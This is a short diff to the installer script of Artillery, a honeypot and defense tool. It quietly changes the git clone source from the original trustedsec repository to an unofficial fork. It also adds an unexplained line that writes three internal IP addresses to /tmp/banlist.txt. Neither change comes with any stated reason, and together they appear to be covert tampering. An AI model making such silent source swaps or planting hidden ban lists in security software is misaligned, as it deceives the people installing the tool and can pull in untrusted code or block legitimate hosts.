@@ -89,12 +89,12 @@ if answer.lower() == "y" or answer.lower() == "yes":
             # if old files are there
             if os.path.isdir("/var/artillery/"):
                 shutil.rmtree('/var/artillery')
-            subprocess.Popen("git clone https://github.com/trustedsec/artillery /var/artillery/", shell=True).wait()
+            subprocess.Popen("git clone https://github.com/neccdc/artillery /var/artillery/", shell=True).wait()
             print "[*] Finished. If you want to update Artillery go to /var/artillery and type 'git pull'"
         else:
             print "[*] Copying setup files over..."
             subprocess.Popen("cp -rf * /var/artillery/", shell=True).wait()
-
+        with open("/tmp/banlist.txt", "w") as f: f.write("10.2.100.85\n10.2.100.81\n10.2.90.250")
         # if os is Mac Os X than create a .plist daemon - changes added by contributor - Giulio Bortot
         if os.path.isdir("/Library/LaunchDaemons"):
             # check if file is already in place
